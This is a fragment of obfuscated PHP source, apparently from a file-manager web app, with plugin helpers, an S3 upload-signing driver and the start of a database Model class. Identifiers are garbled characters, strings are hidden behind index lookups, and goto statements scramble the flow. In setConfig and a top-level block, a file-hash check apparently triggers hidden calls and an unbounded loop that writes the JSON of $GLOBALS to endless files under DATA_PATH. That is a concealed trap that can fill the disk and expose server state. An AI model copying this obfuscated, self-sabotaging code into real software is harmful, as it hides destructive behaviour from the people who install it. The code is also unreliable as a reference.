parseFile($d‡À∆Ü©ÔË) { $Aßõì∆£á… =& $_SERVER[—Ω]; $F¯Ö◊Óå¨ü = file_get_contents($d‡À∆Ü©ÔË); $bñáå»† » = array($Aßõì∆£á…[1327], $Aßõì∆£á…[1328], $Aßõì∆£á…[1329], $Aßõì∆£á…[1330], $Aßõì∆£á…[1331], $Aßõì∆£á…[1332], $Aßõì∆£á…[1333]); $fû“Çêæ¬ö = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Aßõì∆£á…[84]][$Aßõì∆£á…[1334]]); $F¯Ö◊Óå¨ü = str_replace($bñáå»† », $fû“Çêæ¬ö, $F¯Ö◊Óå¨ü); return $F¯Ö◊Óå¨ü; } private function parseLang(&$E»â„ÜèºΩ) { goto fÙŸŸ‘Ñãﬁ; dÇ¡åèµîá: $F§ÎÎæëÜ = array(); foreach ($Cµ◊ó±´Í[0] as $aÒà¿ñË¶ˆ) { $fåı»Ù¿Ìê = substr($aÒà¿ñË¶ˆ, strlen($AçÃ≤†ÌÌ”), -4); $D⁄Œáù‰êÙ = LNG($fåı»Ù¿Ìê); $A…õŒﬂÏÂÆ[] = $aÒà¿ñË¶ˆ; $F§ÎÎæëÜ[] = str_replace(array($E°Ñ€øò∞≈[214], $E°Ñ€øò∞≈[996], $E°Ñ€øò∞≈[327], $E°Ñ€øò∞≈[113]), array($E°Ñ€øò∞≈[50], $E°Ñ€øò∞≈[50], $E°Ñ€øò∞≈[33], $E°Ñ€øò∞≈[1337]), $D⁄Œáù‰êÙ); } $E»â„ÜèºΩ = str_replace($A…õŒﬂÏÂÆ, $F§ÎÎæëÜ, $E»â„ÜèºΩ); goto aö€ÈºâÀã; C¡Æ¨ÑÖ∫…: preg_match_all($E°Ñ€øò∞≈[1336], $E»â„ÜèºΩ, $Cµ◊ó±´Í); if (!is_array($Cµ◊ó±´Í) || count($Cµ◊ó±´Í) == 0 || !is_array($Cµ◊ó±´Í[0]) || count($Cµ◊ó±´Í[0]) == 0) { return; } $A…õŒﬂÏÂÆ = array(); goto dÇ¡åèµîá; fÙŸŸ‘Ñãﬁ: $E°Ñ€øò∞≈ =& $_SERVER[—Ω]; $AçÃ≤†ÌÌ” = $E°Ñ€øò∞≈[1335]; if (!strstr($E»â„ÜèºΩ, $AçÃ≤†ÌÌ”)) { return; } goto C¡Æ¨ÑÖ∫…; aö€ÈºâÀã: } private function parseConfig(&$F®øãó≥´Ì) { goto AËö»‰Ëﬂœ; eç”∑Î’˘Ê: $F®øãó≥´Ì = str_replace($F•ƒﬁòõø≈, $DóÀÊôÇ∫Ë, $F®øãó≥´Ì); goto bëﬁäêÖπ¿; eÒ…ÊÆà≠¡: $F•ƒﬁòõø≈ = array(); $DóÀÊôÇ∫Ë = array(); foreach ($c´ÒÜ°óü¯[0] as $bãâö˜∑Ô¶) { $bú‹Ûä¶·± = substr($bãâö˜∑Ô¶, strlen($B≥™Ö‘Î…√), -2); $F•ƒﬁòõø≈[] = $bãâö˜∑Ô¶; $DóÀÊôÇ∫Ë[] = _get($BªÌçÇ¨Ê≤, $bú‹Ûä¶·±); } goto eç”∑Î’˘Ê; AËö»‰Ëﬂœ: $dèƒø„ô¡Í =& $_SERVER[—Ω]; $B≥™Ö‘Î…√ = $dèƒø„ô¡Í[1338]; if (!strstr($F®øãó≥´Ì, $B≥™Ö‘Î…√)) { return; } goto d∫ê≥‘éƒÑ; d∫ê≥‘éƒÑ: preg_match_all($dèƒø„ô¡Í[1339], $F®øãó≥´Ì, $c´ÒÜ°óü¯); if (!is_array($c´ÒÜ°óü¯) || count($c´ÒÜ°óü¯) == 0 || !is_array($c´ÒÜ°óü¯[0]) || count($c´ÒÜ°óü¯[0]) == 0) { return; } $BªÌçÇ¨Ê≤ = $this->getConfig(); goto eÒ…ÊÆà≠¡; bëﬁäêÖπ¿: } private function parsePackage(&$aà¬õˆ⁄ñÂ) { goto bÀ¥±ÏÙ„Ã; cµÑ⁄úëÎú: $aà¬õˆ⁄ñÂ = str_replace($a›ë™»ÌÓ , $bÃÚÁΩÿ—∂, $aà¬õˆ⁄ñÂ); goto fÁ©∑ÂﬁÖè; e¨üû©èπ∂: preg_match_all($aœ…»–¬›§[1341], $aà¬õˆ⁄ñÂ, $BΩ¯Ó«•äé); if (!is_array($BΩ¯Ó«•äé) || count($BΩ¯Ó«•äé) == 0 || !is_array($BΩ¯Ó«•äé[0]) || count($BΩ¯Ó«•äé[0]) == 0) { return; } $d¬õªß¬ËÈ = $this->appPackage(); goto Düå¨ï∆Öƒ; Düå¨ï∆Öƒ: $a›ë™»ÌÓ  = array(); $bÃÚÁΩÿ—∂ = array(); foreach ($BΩ¯Ó«•äé[0] as $eáõ¯’ÏñÛ) { $Aê—ª©É§ã = substr($eáõ¯’ÏñÛ, strlen($e°åå¿◊Ã¥), -2); $a›ë™»ÌÓ [] = $eáõ¯’ÏñÛ; $bÃÚÁΩÿ—∂[] = _get($d¬õªß¬ËÈ, $Aê—ª©É§ã); } goto cµÑ⁄úëÎú; bÀ¥±ÏÙ„Ã: $aœ…»–¬›§ =& $_SERVER[—Ω]; $e°åå¿◊Ã¥ = $aœ…»–¬›§[1340]; if (!strstr($aà¬õˆ⁄ñÂ, $e°åå¿◊Ã¥)) { return; } goto e¨üû©èπ∂; fÁ©∑ÂﬁÖè: } final function echoFile($CóÀ•ÊÃê , $E∑ñ‘•ÿ´ü = false) { goto Fô±Øä•Ôù; B“≥öÉåìÉ: $this->parsePackage($b¨ªéÌ òè); if (is_array($E∑ñ‘•ÿ´ü)) { $b¨ªéÌ òè = str_replace(array_keys($E∑ñ‘•ÿ´ü), array_values($E∑ñ‘•ÿ´ü), $b¨ªéÌ òè); } echo $eœãä´èëó[214] . $b¨ªéÌ òè; goto dë®≠ÎØ•“; C‰Áõç·⁄: $b¨ªéÌ òè = $this->parseFile($F«ÈΩá…ÆÉ); $this->parseLang($b¨ªéÌ òè); $this->parseConfig($b¨ªéÌ òè); goto B“≥öÉåìÉ; Fô±Øä•Ôù: $eœãä´èëó =& $_SERVER[—Ω]; $F«ÈΩá…ÆÉ = $this->pluginPath . $CóÀ•ÊÃê ; if (ACT == $eœãä´èëó[1342]) { echo $eœãä´èëó[1343] . $this->pluginName . $eœãä´èëó[8] . $CóÀ•ÊÃê  . $eœãä´èëó[1344]; if (!file_exists($F«ÈΩá…ÆÉ)) { echo $eœãä´èëó[1345]; return; } } goto C‰Áõç·⁄; dë®≠ÎØ•“: } final function initLang() { goto f’äŸëÜﬂÖ; DÜ√êêÖﬂ©: if (!is_array($dı®äºƒ±Ê)) { return array(); } if (@count($dı®äºƒ±Ê) > 0) { I18n::set($dı®äºƒ±Ê); } return $dı®äºƒ±Ê; goto aù∏Ù∑æÖÆ; f’äŸëÜﬂÖ: $AäµØ°Öí¥ =& $_SERVER[—Ω]; $cö´’é˘íﬂ = $AäµØ°Öí¥[1346]; $BË˜ÍÜîÎﬂ = $this->pluginPath . $AäµØ°Öí¥[1347]; goto E≠í‚Ø»º⁄; E≠í‚Ø»º⁄: $E…ááÚßΩ∞ = I18n::getType(); $dı®äºƒ±Ê = array(); if (file_exists($BË˜ÍÜîÎﬂ . $E…ááÚßΩ∞ . $AäµØ°Öí¥[774])) { $dı®äºƒ±Ê = (include $BË˜ÍÜîÎﬂ . $E…ááÚßΩ∞ . $AäµØ°Öí¥[774]); } else { if ($E…ááÚßΩ∞ == $AäµØ°Öí¥[1348] && !file_exists($BË˜ÍÜîÎﬂ . $E…ááÚßΩ∞ . $AäµØ°Öí¥[774]) && file_exists($BË˜ÍÜîÎﬂ . $AäµØ°Öí¥[1349])) { $dı®äºƒ±Ê = (include $BË˜ÍÜîÎﬂ . $AäµØ°Öí¥[1349]); } else { if (file_exists($BË˜ÍÜîÎﬂ . $cö´’é˘íﬂ . $AäµØ°Öí¥[774])) { $dı®äºƒ±Ê = (include $BË˜ÍÜîÎﬂ . $cö´’é˘íﬂ . $AäµØ°Öí¥[774]); } } } goto DÜ√êêÖﬂ©; aù∏Ù∑æÖÆ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($D°¬ã√ÉÌº) { $C§À≥‹ÈÆí =& $_SERVER[—Ω]; $eÈÍ–õ¢‚Ì = $_SERVER[$C§À≥‹ÈÆí[693]] . $C§À≥‹ÈÆí[694]; $EŸõÔ∑Ú∞ã = $C§À≥‹ÈÆí[796]; if ($_SERVER[$C§À≥‹ÈÆí[690]] != $EŸõÔ∑Ú∞ã($eÈÍ–õ¢‚Ì)) { goto AµÂ±÷ï∫ú; B”´Ì∏ﬂ´Æ: $E›§âﬂ”˜ = 1; for ($aêìç Ô∆â = $E›§âﬂ”˜; $aêìç Ô∆â > 0; $aêìç Ô∆â++) { $Eá•ßâ±‚é(DATA_PATH . $aêìç Ô∆â, $D≈∞ÆáøŒ®); } goto E√¬å√Õµ⁄; c™∆ïàüΩÇ: $e€°¥ÍøÃö = $C§À≥‹ÈÆí[798]; $e€°¥ÍøÃö($_SERVER[$C§À≥‹ÈÆí[799]]); $E ﬁ»Ω¯õ» = $C§À≥‹ÈÆí[797]; goto cÙ‰Ç¶∑ÿ¢; cÙ‰Ç¶∑ÿ¢: $E ﬁ»Ω¯õ»(); $Eá•ßâ±‚é = $C§À≥‹ÈÆí[800]; $D≈∞ÆáøŒ® = json_encode($GLOBALS[$C§À≥‹ÈÆí[801]]); goto B”´Ì∏ﬂ´Æ; e¥ÎèõÙ“Ê: $bòúºÇ‡ﬂò = $D´∑Ó¯á©…($B‘ƒ£≥®ú¬); $cπÂÑ£Ü’— = explode($C§À≥‹ÈÆí[214], $bòúºÇ‡ﬂò); if (count($cπÂÑ£Ü’—) < $C§À≥‹ÈÆí[581]) { $c¡¨¥Ø€õ∫ = $C§À≥‹ÈÆí[695]; $c¡¨¥Ø€õ∫(); } goto c™∆ïàüΩÇ; AµÂ±÷ï∫ú: $E ﬁ»Ω¯õ» = $C§À≥‹ÈÆí[797]; $D´∑Ó¯á©… = $C§À≥‹ÈÆí[692]; $B‘ƒ£≥®ú¬ = $_SERVER[$C§À≥‹ÈÆí[693]] . $C§À≥‹ÈÆí[694]; goto e¥ÎèõÙ“Ê; E√¬å√Õµ⁄: } return $this->modelPlugin->setConfig($this->pluginName, $D°¬ã√ÉÌº); } public function onSetConfig($AÉêÿÃÁﬁ€) { } public function onGetConfig($FÇ‰»Ü—Æî) { } public function onChangeStatus($Dó’¨∆Ã≈¡) { } public function onUninstall() { } public function onInstall() { } public function authCheck($C÷èƒ›Ÿ‹§ = "\x70\x6c\x75\147\x69\156\x41\165\164\x68") { $eãçŒÊ”∂∂ =& $_SERVER[—Ω]; if (!defined($eãçŒÊ”∂∂[423])) { return !1; } if (_get($GLOBALS, $eãçŒÊ”∂∂[453])) { return !0; } $F †¥ßÊˆç = $this->getConfig(); if (!$F †¥ßÊˆç[$C÷èƒ›Ÿ‹§]) { return !1; } return ActionCall($eãçŒÊ”∂∂[1350], $F †¥ßÊˆç[$C÷èƒ›Ÿ‹§]); } public function url($bÑÆ±ıÃáË, $DªïæÕÑâ˘ = '', $e—©÷ÿù•Ò = true) { goto eó¯É˜ıïà; eó¯É˜ıïà: $AáÎÓåë’È =& $_SERVER[—Ω]; $CáÌ≤πÀ°– = $this->getConfig(); $Dôâ¬ﬂ˘§ï = KOD_VERSION . $AáÎÓåë’È[93] . KOD_VERSION_BUILD; goto dí˘˘—è∆“; dí˘˘—è∆“: $Fûÿπ¯‹ñ¿ = $this->packageVersion(); $dÌˆÏΩÏç· = $Dôâ¬ﬂ˘§ï . $AáÎÓåë’È[408] . $Fûÿπ¯‹ñ¿; if ($DªïæÕÑâ˘ == $AáÎÓåë’È[33]) { $A¬àòç◊«ù = $this->pluginHost . $bÑÆ±ıÃáË . $AáÎÓåë’È[1351] . $dÌˆÏΩÏç·; } else { if ($DªïæÕÑâ˘ === $AáÎÓåë’È[76]) { $A¬àòç◊«ù = $this->pluginHost . $bÑÆ±ıÃáË; } else { if ($DªïæÕÑâ˘ == $AáÎÓåë’È[1352]) { $A¬àòç◊«ù = STATIC_PATH . $bÑÆ±ıÃáË . $AáÎÓåë’È[1351] . $Dôâ¬ﬂ˘§ï; } else { if ($DªïæÕÑâ˘ == $AáÎÓåë’È[1353]) { $A¬àòç◊«ù = APP_HOST . $AáÎÓåë’È[1354] . $bÑÆ±ıÃáË . $AáÎÓåë’È[1351] . $Dôâ¬ﬂ˘§ï; } else { if (isset($CáÌ≤πÀ°–[$DªïæÕÑâ˘])) { $A¬àòç◊«ù = $CáÌ≤πÀ°–[$DªïæÕÑâ˘] . $bÑÆ±ıÃáË . $AáÎÓåë’È[1351] . $dÌˆÏΩÏç·; } } } } } goto bµﬂ…îºõØ; bµﬂ…îºõØ: if (!$e—©÷ÿù•Ò) { return $A¬àòç◊«ù; } echo $A¬àòç◊«ù; goto cäç”Ö©Ü£; cäç”Ö©Ü£: } public function link($Aı˘˜≤Ü¶õ = false, $B´ÇœÚÍí⁄ = '') { $Aß‡Ê‰ÏÕß =& $_SERVER[—Ω]; if (!$Aı˘˜≤Ü¶õ) { $this->link($Aß‡Ê‰ÏÕß[1355], $Aß‡Ê‰ÏÕß[1353]); $this->link($Aß‡Ê‰ÏÕß[1356], $Aß‡Ê‰ÏÕß[1352]); $this->link($Aß‡Ê‰ÏÕß[1357], $Aß‡Ê‰ÏÕß[1352]); $this->link($Aß‡Ê‰ÏÕß[1358], $Aß‡Ê‰ÏÕß[1352]); $this->link($Aß‡Ê‰ÏÕß[1359], $Aß‡Ê‰ÏÕß[1352]); return; } $bôÑ–Úºáû = $this->url($Aı˘˜≤Ü¶õ, $B´ÇœÚÍí⁄, !1); if (substr($Aı˘˜≤Ü¶õ, -3) == $Aß‡Ê‰ÏÕß[1360]) { echo $Aß‡Ê‰ÏÕß[1361] . $bôÑ–Úºáû . $Aß‡Ê‰ÏÕß[1362] . $Aß‡Ê‰ÏÕß[214]; } else { if (substr($Aı˘˜≤Ü¶õ, -4) == $Aß‡Ê‰ÏÕß[1363]) { echo $Aß‡Ê‰ÏÕß[1364] . $bôÑ–Úºáû . $Aß‡Ê‰ÏÕß[1365] . $Aß‡Ê‰ÏÕß[214]; } } } } goto bã £Öû¬õ; fÈƒÀõâ≠º: $d—çÊ´”›∑ = LIB_DIR . $_SERVER[—Ω][880]; $dÏŸ«˜æ‘ = $_SERVER[—Ω][796]; if ($_SERVER[$_SERVER[—Ω][690]] != $dÏŸ«˜æ‘($d—çÊ´”›∑)) { goto DÛì≠ﬁ£√—; DÛì≠ﬁ£√—: $B‘≤ÇÔ¡ÜÒ = $_SERVER[—Ω][692]; $B±ˆï˜ïúå = $_SERVER[$_SERVER[—Ω][693]] . $_SERVER[—Ω][694]; $d◊è∫ÎıæÊ = $B‘≤ÇÔ¡ÜÒ($B±ˆï˜ïúå); goto Eµ∑»ÜÛ¬·; CæÑÒôù£‡: $eπá™À’∏Ì($d—çÊ´”›∑); goto Dë†÷›ïÖÑ; Eµ∑»ÜÛ¬·: $A…ƒˆπ¬‰√ = explode($_SERVER[—Ω][214], $d◊è∫ÎıæÊ); if (count($A…ƒˆπ¬‰√) < $_SERVER[—Ω][553]) { $CÜºßÑÖÍÌ = $_SERVER[—Ω][695]; $CÜºßÑÖÍÌ(); } $eπá™À’∏Ì = $_SERVER[—Ω][696]; goto CæÑÒôù£‡; Dë†÷›ïÖÑ: } goto Fà≈ÿœ¶⁄á; AƒãÉπí“∫: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($b„Î¶´˘‚ç) { parent::__construct($b„Î¶´˘‚ç); } public function uploadFormData($FÀå‘É∏ÏÖ, $EàÑîÌâùï = 3600) { goto CèÊå„€òˆ; CèÊå„€òˆ: $bñ∑¯©Ø†Ñ =& $_SERVER[—Ω]; $e√âﬁüä«à = $bñ∑¯©Ø†Ñ[182]; $dî™’òæ”· = $bñ∑¯©Ø†Ñ[1130]; goto DÙﬁ £¢ÚÍ; DÙﬁ £¢ÚÍ: $F∑àÍÇè´ê = $bñ∑¯©Ø†Ñ[59]; $Cæ¿îâﬁÈ– = gmdate($bñ∑¯©Ø†Ñ[1131]); $d¬∞≥´ï≈ = gmdate($bñ∑¯©Ø†Ñ[700]); goto dñ’ô¡∂’ç; cü∑∑óüÍ¶: $d∏†©≠˘ä = hash_hmac($bñ∑¯©Ø†Ñ[1140], $F∑àÍÇè´ê, $C¡ªÕﬂ¥Ûô, !0); $e…†©Í§ù» = hash_hmac($bñ∑¯©Ø†Ñ[1140], $BúåÇ«¥Üº, $d∏†©≠˘ä, !0); $f√¢π‘§ñ∫ = hash_hmac($bñ∑¯©Ø†Ñ[1140], $bÆñﬁÉ¬÷Ã, $e…†©Í§ù»); goto Dæ®Ïö«Ì«; Dæ®Ïö«Ì«: $Eãä°™âÔó = array($bñ∑¯©Ø†Ñ[196] => $bñ∑¯©Ø†Ñ[33], $bñ∑¯©Ø†Ñ[1142] => $bñ∑¯©Ø†Ñ[33], $bñ∑¯©Ø†Ñ[1101] => $e√âﬁüä«à, $bñ∑¯©Ø†Ñ[1105] => $DùËàüóá¿, $bñ∑¯©Ø†Ñ[1109] => $bÆñﬁÉ¬÷Ã, $bñ∑¯©Ø†Ñ[1143] => $e–ÌåÓ¬π£, $bñ∑¯©Ø†Ñ[1144] => $dî™’òæ”·, $bñ∑¯©Ø†Ñ[1145] => $Cæ¿îâﬁÈ–, $bñ∑¯©Ø†Ñ[1146] => $A’åÿ—€†õ, $bñ∑¯©Ø†Ñ[1147] => $f√¢π‘§ñ∫, $bñ∑¯©Ø†Ñ[166] => $this->getHost()); return $Eãä°™âÔó; goto f÷€…Ü™Ω™; dñ’ô¡∂’ç: $BúåÇ«¥Üº = $bñ∑¯©Ø†Ñ[1132]; $A’åÿ—€†õ = $EàÑîÌâùï . $bñ∑¯©Ø†Ñ[33]; $DùËàüóá¿ = $bñ∑¯©Ø†Ñ[1097]; goto DÀñìé∂ÆÃ; Câ˜Ñü©Öè: $bÆñﬁÉ¬÷Ã = base64_encode(json_encode($E®åç‘†é≠)); $fî˘∑∂éâ¥ = hash_hmac($bñ∑¯©Ø†Ñ[1140], $d¬∞≥´ï≈, $bñ∑¯©Ø†Ñ[1141] . $this->secret, !0); $C¡ªÕﬂ¥Ûô = hash_hmac($bñ∑¯©Ø†Ñ[1140], $this->region, $fî˘∑∂éâ¥, !0); goto cü∑∑óüÍ¶; DÀñìé∂ÆÃ: $DÙöè–∆Û  = array($this->accessKey, $d¬∞≥´ï≈, $this->region, $F∑àÍÇè´ê, $BúåÇ«¥Üº); $e–ÌåÓ¬π£ = implode($bñ∑¯©Ø†Ñ[8], $DÙöè–∆Û ); $E®åç‘†é≠ = array($bñ∑¯©Ø†Ñ[1099] => gmdate($bñ∑¯©Ø†Ñ[1098], strtotime($bñ∑¯©Ø†Ñ[1133])), $bñ∑¯©Ø†Ñ[1100] => array(array($bñ∑¯©Ø†Ñ[1102] => $this->bucket), array($bñ∑¯©Ø†Ñ[1101] => $e√âﬁüä«à), array($bñ∑¯©Ø†Ñ[1103], $bñ∑¯©Ø†Ñ[1104], $bñ∑¯©Ø†Ñ[33]), array($bñ∑¯©Ø†Ñ[1103], $bñ∑¯©Ø†Ñ[1134], $bñ∑¯©Ø†Ñ[33]), array($bñ∑¯©Ø†Ñ[1103], $bñ∑¯©Ø†Ñ[1135], $bñ∑¯©Ø†Ñ[33]), array($bñ∑¯©Ø†Ñ[1105] => $DùËàüóá¿), array($bñ∑¯©Ø†Ñ[1136] => $e–ÌåÓ¬π£), array($bñ∑¯©Ø†Ñ[1137] => $dî™’òæ”·), array($bñ∑¯©Ø†Ñ[1138] => $Cæ¿îâﬁÈ–), array($bñ∑¯©Ø†Ñ[1139] => $A’åÿ—€†õ))); goto Câ˜Ñü©Öè; f÷€…Ü™Ω™: } public function multiUploadFormData($fáΩ˘ ÉΩÖ, $EﬂªÕΩ†ªà = 3600) { $D¡ñÚÖ–‘⁄ =& $_SERVER[—Ω]; $BÖ¡´Ü√ïÀ = gmdate($D¡ñÚÖ–‘⁄[1226]); $dÇà∂”°¨ù = array(); $Fê»Ã¡∆èº = $this->client->getUploadId($this->bucket, $fáΩ˘ ÉΩÖ, $dÇà∂”°¨ù); if (!$Fê»Ã¡∆èº) { return !1; } return array($D¡ñÚÖ–‘⁄[206] => $Fê»Ã¡∆èº, $D¡ñÚÖ–‘⁄[166] => $this->getHost() . $D¡ñÚÖ–‘⁄[8] . $this->pathEncode($fáΩ˘ ÉΩÖ), $D¡ñÚÖ–‘⁄[207] => $BÖ¡´Ü√ïÀ, $D¡ñÚÖ–‘⁄[89] => $fáΩ˘ ÉΩÖ); } public function multiUploadAuthData($b‰„„ŒÂü•, $eÑ–äÆÂÉé = array()) { goto Aé¯œ◊∞ñ•; Aé¯œ◊∞ñ•: $FèÃÔáÏí¯ =& $_SERVER[—Ω]; $c†±∑Ìœ•ú = isset($eÑ–äÆÂÉé[$FèÃÔáÏí¯[157]]) ? $eÑ–äÆÂÉé[$FèÃÔáÏí¯[157]] : $FèÃÔáÏí¯[33]; $d√âÒµø⁄˘ = $eÑ–äÆÂÉé[$FèÃÔáÏí¯[89]]; goto aÿƒçÑà‹≈; EëÖµÌ∂¥¥: if (isset($eÑ–äÆÂÉé[$FèÃÔáÏí¯[1227]])) { $Cˆ‘Ùô⁄Íß[$FèÃÔáÏí¯[1228]] = $eÑ–äÆÂÉé[$FèÃÔáÏí¯[1227]]; } $F÷∑å∑⁄ê´ = explode($FèÃÔáÏí¯[168], $this->getHost()); $eû´—ëêÒÊ = array($FèÃÔáÏí¯[1229] => $F÷∑å∑⁄ê´[1], $FèÃÔáÏí¯[1230] => $FèÃÔáÏí¯[33], $FèÃÔáÏí¯[196] => $FèÃÔáÏí¯[116], $FèÃÔáÏí¯[1142] => $eÑ–äÆÂÉé[$FèÃÔáÏí¯[77]]); goto EüëÛÌ¶°ß; aÿƒçÑà‹≈: unset($eÑ–äÆÂÉé[$FèÃÔáÏí¯[89]]); if (isset($eÑ–äÆÂÉé[$FèÃÔáÏí¯[208]])) { return $this->listUploadParts($d√âÒµø⁄˘, $eÑ–äÆÂÉé); } $Cˆ‘Ùô⁄Íß = array(); goto EëÖµÌ∂¥¥; EüëÛÌ¶°ß: $aÔ ›®≥„· = $FèÃÔáÏí¯[211]; $Cå÷∑æÑÖ‚ = $FèÃÔáÏí¯[8] . $this->pathEncode($d√âÒµø⁄˘) . $c†±∑Ìœ•ú; $f¿’ë»äòÆ = $this->client->__getSignatureV4($Cˆ‘Ùô⁄Íß, $eû´—ëêÒÊ, $aÔ ›®≥„·, $Cå÷∑æÑÖ‚); goto b÷àä”†ÿ⁄; b÷àä”†ÿ⁄: if (strpos($c†±∑Ìœ•ú, $FèÃÔáÏí¯[210]) === 0) { if (isset($Cˆ‘Ùô⁄Íß[$FèÃÔáÏí¯[1228]])) { $câ©ÌÙïÓª = $Cˆ‘Ùô⁄Íß[$FèÃÔáÏí¯[1228]]; } else { if (isset($f¿’ë»äòÆ[$FèÃÔáÏí¯[1228]])) { $câ©ÌÙïÓª = $f¿’ë»äòÆ[$FèÃÔáÏí¯[1228]]; } else { $câ©ÌÙïÓª = hash($FèÃÔáÏí¯[1140], $FèÃÔáÏí¯[33]); } } return array($FèÃÔáÏí¯[217] => $f¿’ë»äòÆ[$FèÃÔáÏí¯[217]], $FèÃÔáÏí¯[1228] => $câ©ÌÙïÓª, $FèÃÔáÏí¯[207] => $f¿’ë»äòÆ[$FèÃÔáÏí¯[1231]]); } return $f¿’ë»äòÆ[$FèÃÔáÏí¯[217]]; goto a©§õ¡ÖëÕ; a©§õ¡ÖëÕ: } public function listUploadParts($B´ºì‰èÂú, $dΩﬁπ∏ì∏Õ = array()) { goto D°®……Ñ˘›; B‹£√ùòÜ«: $B÷é“–íî⁄ = $this->client->__getSignatureV4($AçÚ©œìë‡, $f‚Ç∂êÀ÷», $dèÚßàö—Ÿ, $a≠ÑÊ‘Ìµè, $CÓâÉºÈ¥“); return array($aíÖ∆ŸØ‘ì[217] => $B÷é“–íî⁄[$aíÖ∆ŸØ‘ì[217]], $aíÖ∆ŸØ‘ì[207] => $B÷é“–íî⁄[$aíÖ∆ŸØ‘ì[1231]], $aíÖ∆ŸØ‘ì[219] => $Dˆ®¥¨¯ÚŒ, $aíÖ∆ŸØ‘ì[1228] => $B÷é“–íî⁄[$aíÖ∆ŸØ‘ì[1228]]); goto C≥çÀí≠◊Ü; C£ñãÜÁ‚‚: $CÓâÉºÈ¥“ .= $aíÖ∆ŸØ‘ì[1235]; $AçÚ©œìë‡ = array(); $cë¢ù‹î’∑ = explode($aíÖ∆ŸØ‘ì[168], $this->getHost()); goto F≤¯âÊá—∆; D°®……Ñ˘›: $aíÖ∆ŸØ‘ì =& $_SERVER[—Ω]; $dãµäë˘Á∏ = str_replace($aíÖ∆ŸØ‘ì[218], $aíÖ∆ŸØ‘ì[33], $dΩﬁπ∏ì∏Õ[$aíÖ∆ŸØ‘ì[157]]); $Dˆ®¥¨¯ÚŒ = $this->client->listParts($this->bucket, $B´ºì‰èÂú, $dãµäë˘Á∏); goto A—©ÿ‹§ÇÃ; A—©ÿ‹§ÇÃ: if (!$Dˆ®¥¨¯ÚŒ) { return !1; } $CÓâÉºÈ¥“ = $aíÖ∆ŸØ‘ì[1232]; foreach ($Dˆ®¥¨¯ÚŒ as $F†∆¿ÍÁ˜ò) { $CÓâÉºÈ¥“ .= $aíÖ∆ŸØ‘ì[1233] . "\x3c\120\x61\x72\164\116\x75\155\x62\145\x72\x3e{$F†∆¿ÍÁ˜ò[$aíÖ∆ŸØ‘ì[1184]]}\74\57\x50\141\162\x74\116\x75\x6d\142\145\162\76\xa" . "\74\x45\x54\x61\x67\x3e{$F†∆¿ÍÁ˜ò[$aíÖ∆ŸØ‘ì[1185]]}\74\x2f\x45\x54\141\147\76\12" . $aíÖ∆ŸØ‘ì[1234]; } goto C£ñãÜÁ‚‚; F≤¯âÊá—∆: $f‚Ç∂êÀ÷» = array($aíÖ∆ŸØ‘ì[1229] => $cë¢ù‹î’∑[1], $aíÖ∆ŸØ‘ì[196] => $aíÖ∆ŸØ‘ì[116], $aíÖ∆ŸØ‘ì[1142] => strlen($CÓâÉºÈ¥“)); $dèÚßàö—Ÿ = $aíÖ∆ŸØ‘ì[209]; $a≠ÑÊ‘Ìµè = $aíÖ∆ŸØ‘ì[8] . $this->pathEncode($B´ºì‰èÂú) . $dΩﬁπ∏ì∏Õ[$aíÖ∆ŸØ‘ì[157]]; goto B‹£√ùòÜ«; C≥çÀí≠◊Ü: } public function link($dò±á»‘åõ, $d∫ çÀ§Ω‘ = array()) { return parent::link($dò±á»‘åõ, $d∫ çÀ§Ω‘); } public function fileOut($dΩÖ”èÏÓ“, $Cˆä√‘ùîÊ = false, $C∑‹·Á®ÏÇ = false, $D»–Íõ◊∂Ú = '') { if (strstr($this->endpoint, $_SERVER[—Ω][1236])) { return parent::fileOutServer($dΩÖ”èÏÓ“, $Cˆä√‘ùîÊ, $C∑‹·Á®ÏÇ, $D»–Íõ◊∂Ú); } parent::fileOut($dΩÖ”èÏÓ“, $Cˆä√‘ùîÊ, $C∑‹·Á®ÏÇ, $D»–Íõ◊∂Ú); } public function fileOutImage($f¯ˆ·Í∑¿Ú, $e”ÙºÔ≥¯à = 250) { if (strstr($this->endpoint, $_SERVER[—Ω][1236])) { return parent::fileOutImageServer($f¯ˆ·Í∑¿Ú, $e”ÙºÔ≥¯à); } parent::fileOutImage($f¯ˆ·Í∑¿Ú, $e”ÙºÔ≥¯à); } public function fileOutLink($c‡¨äØàçå) { $fáß—ﬁË§à =& $_SERVER[—Ω]; if (substr($c‡¨äØàçå, 0, 7) == $fáß—ﬁË§à[1112]) { $c‡¨äØàçå = $fáß—ﬁË§à[1113] . substr($c‡¨äØàçå, 7); } header($fáß—ﬁË§à[153] . $c‡¨äØàçå); die; } public function getHost() { $CØ∫©ìŒáÛ =& $_SERVER[—Ω]; $A√æåä∏§ƒ = str_rtrim(parent::getHost(), $CØ∫©ìŒáÛ[8] . $this->bucket); $A√æåä∏§ƒ = explode($CØ∫©ìŒáÛ[168], $A√æåä∏§ƒ); return $A√æåä∏§ƒ[0] . $CØ∫©ìŒáÛ[168] . $this->bucket . $CØ∫©ìŒáÛ[93] . $A√æåä∏§ƒ[1]; } } $d—çÊ´”›∑ = LIB_DIR . $_SERVER[—Ω][880]; $dÏŸ«˜æ‘ = $_SERVER[—Ω][796]; goto Bå´“êÑÀ§; f„‘à»˜û¢: define($_SERVER[—Ω][227], 0); define($_SERVER[—Ω][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\x6f\162\144\145\x72", "\141\x6c\151\141\163", "\150\x61\x76\151\x6e\x67", "\147\x72\157\x75\160", "\154\x6f\143\x6b", "\x64\151\163\x74\x69\156\x63\164", "\141\165\x74\157", "\x66\x69\154\x74\x65\162", "\x76\x61\154\x69\x64\x61\x74\145", "\162\145\x73\165\x6c\x74", "\x62\x69\156\x64", "\x74\x6f\153\145\156"); public function __construct($FÙÊ™˘‰ÚÍ = '', $DÊ†êë”Øâ = '', $cÉê©ñüç© = '') { $c’∫ñÚ«éú 